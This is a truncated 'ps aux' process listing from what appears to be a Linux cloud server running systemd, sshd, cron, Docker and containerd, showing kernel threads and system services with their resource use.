root         8  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    00:41   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    00:41   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S    00:41   0:00 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S    00:41   0:00 [migration/1]
root        16  0.0  0.0      0     0 ?        S    00:41   0:00 [ksoftirqd/1]
root        17  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/1:0]
root        18  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S    00:41   0:00 [kdevtmpfs]
root        20  0.0  0.0      0     0 ?        I<   00:41   0:00 [netns]
root        21  0.0  0.0      0     0 ?        S    00:41   0:00 [rcu_tasks_kthre]
root        22  0.0  0.0      0     0 ?        S    00:41   0:00 [kauditd]
root        24  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/0:1]
root        25  0.0  0.0      0     0 ?        S    00:41   0:00 [khungtaskd]
root        26  0.0  0.0      0     0 ?        S    00:41   0:00 [oom_reaper]
root        27  0.0  0.0      0     0 ?        I<   00:41   0:00 [writeback]
root        28  0.0  0.0      0     0 ?        S    00:41   0:00 [kcompactd0]
root        29  0.0  0.0      0     0 ?        SN   00:41   0:00 [ksmd]
root        30  0.0  0.0      0     0 ?        SN   00:41   0:00 [khugepaged]
root        31  0.0  0.0      0     0 ?        I<   00:41   0:00 [crypto]
root        32  0.0  0.0      0     0 ?        I<   00:41   0:00 [kintegrityd]
root        33  0.0  0.0      0     0 ?        I<   00:41   0:00 [kblockd]
root        34  0.0  0.0      0     0 ?        I<   00:41   0:00 [ata_sff]
root        35  0.0  0.0      0     0 ?        I<   00:41   0:00 [md]
root        36  0.0  0.0      0     0 ?        I<   00:41   0:00 [edac-poller]
root        37  0.0  0.0      0     0 ?        I<   00:41   0:00 [devfreq_wq]
root        38  0.0  0.0      0     0 ?        I<   00:41   0:00 [watchdogd]
root        41  0.0  0.0      0     0 ?        S    00:41   0:00 [kswapd0]
root        42  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/u5:0]
root        43  0.0  0.0      0     0 ?        S    00:41   0:00 [ecryptfs-kthrea]
root        85  0.0  0.0      0     0 ?        I<   00:41   0:00 [kthrotld]
root        86  0.0  0.0      0     0 ?        I<   00:41   0:00 [acpi_thermal_pm]
root        90  0.0  0.0      0     0 ?        I<   00:41   0:00 [ipv6_addrconf]
root        99  0.0  0.0      0     0 ?        I<   00:41   0:00 [kstrp]
root       104  0.0  0.0      0     0 ?        I    00:41   0:00 [kworker/0:2]
root       117  0.0  0.0      0     0 ?        I<   00:41   0:00 [charger_manager]
root       155  0.0  0.0      0     0 ?        I<   00:41   0:00 [nvme-wq]
root       157  0.0  0.0      0     0 ?        I<   00:41   0:00 [ena]
root       222  0.0  0.0      0     0 ?        I<   00:41   0:00 [kdmflush]
root       224  0.0  0.0      0     0 ?        I<   00:41   0:00 [bioset]
root       300  0.0  0.0      0     0 ?        I<   00:41   0:00 [raid5wq]
root       353  0.0  0.0      0     0 ?        S    00:41   0:00 [jbd2/dm-0-8]
root       354  0.0  0.0      0     0 ?        I<   00:41   0:00 [ext4-rsv-conver]
root       387  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/1:1H]
root       388  0.0  0.0      0     0 ?        I<   00:41   0:00 [kworker/0:1H]
root       430  0.0  0.8  94884 16980 ?        S<s  00:42   0:00 /lib/systemd/systemd
root       446  0.0  0.0      0     0 ?        I<   00:42   0:00 [iscsi_eh]
root       448  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-wq]
root       449  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib-comp-unb-wq]
root       450  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_mcast]
root       451  0.0  0.0      0     0 ?        I<   00:42   0:00 [ib_nl_sa_wq]
root       452  0.0  0.0      0     0 ?        I<   00:42   0:00 [rdma_cm]
root       453  0.0  0.0 105904  1764 ?        Ss   00:42   0:00 /sbin/lvmetad -f
root       459  0.0  0.2  46748  5580 ?        Ss   00:42   0:01 /lib/systemd/systemd
root       462  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop0]
root       463  0.0  0.0      0     0 ?        S<   00:42   0:00 [loop1]
root       631  0.0  0.0      0     0 ?        S    00:42   0:00 [jbd2/nvme1n1p2-]
root       632  0.0  0.0      0     0 ?        I<   00:42   0:00 [ext4-rsv-conver]
62583      746  0.0  0.1 141960  3248 ?        Ssl  00:42   0:00 /lib/systemd/systemd
_apt       881  0.0  0.2  80204  5396 ?        Ss   00:42   0:00 /lib/systemd/systemd
sshd       922  0.0  0.3  70792  6208 ?        Ss   00:42   0:00 /lib/systemd/systemd
daemon    1019  0.0  0.1  28332  2464 ?        Ss   00:42   0:00 /usr/sbin/atd -f
102       1021  0.0  0.2 263036  4424 ?        Ssl  00:42   0:00 /usr/sbin/rsyslogd -
root      1027  0.0  0.0 161076  1548 ?        Ssl  00:42   0:00 /usr/bin/lxcfs /var/
root      1032  0.0  0.3 286452  6780 ?        Ssl  00:42   0:00 /usr/lib/accountsser
root      1033  0.0  0.2  62156  5768 ?        Ss   00:42   0:00 /lib/systemd/systemd
103       1036  0.0  0.2  50104  4328 ?        Ss   00:42   0:00 /usr/bin/dbus-daemon
root      1096  0.0  1.3 876020 26896 ?        Ssl  00:42   0:00 /usr/bin/amazon-ssm-
root      1097  0.0  0.8 169192 17112 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
root      1105  0.0  0.1  30104  3204 ?        Ss   00:42   0:00 /usr/sbin/cron -f
root      1111  0.0  1.4 931740 28932 ?        Ssl  00:42   0:01 /usr/lib/snapd/snapd
root      1114  0.0  0.1 110416  2056 ?        Ssl  00:42   0:00 /usr/sbin/irqbalance
root      1119  0.1  2.4 1288996 49196 ?       Ssl  00:42   0:04 /usr/bin/containerd
root      1122  0.0  0.9 186032 19924 ?        Ssl  00:42   0:00 /usr/bin/python3 /us
root      1132  0.0  0.1  14768  2320 ttyS0    Ss+  00:42   0:00 /sbin/agetty -o -p -
root      1134  0.0  0.3 291448  7096 ?        Ssl  00:42   0:00 /usr/lib/policykit-1
root      1143  0.0  0.1  13244  2020 tty1     Ss+  00:42   0:00 /sbin/agetty -o -p -
root      1205  0.0  0.3  72304  6428 ?        Ss   00:42   0:00 /usr/sbin/sshd -D
root      1423  0.0  4.2 1401928 85800 ?       Ssl  00:42   0:02 /usr/bin/dockerd -H 
root      1684  0.0  0.1 479372  3932 ?        Sl   00:42   0:00 /usr/bin/docker-prox
root      1704  0.0  0.2 553104  4048 ?        Sl   00:42   0:00 /usr/bin/docker-prox
root      1717  0.0  0.1 407048  3904 ?        Sl   00:42   0:00 /usr/bin/docker-prox
root      1723  0.0  0.2 108724  5532 ?        Sl   00:42   0:00 containerd-shim -nam
root      1724  0.0  0.2 108724  5628 ?        Sl   00:42   0:00 containerd-shim -nam
root      1728  0.0  0.3 108724  6360 ?        Sl   00:42   0:00 containerd-shim -nam
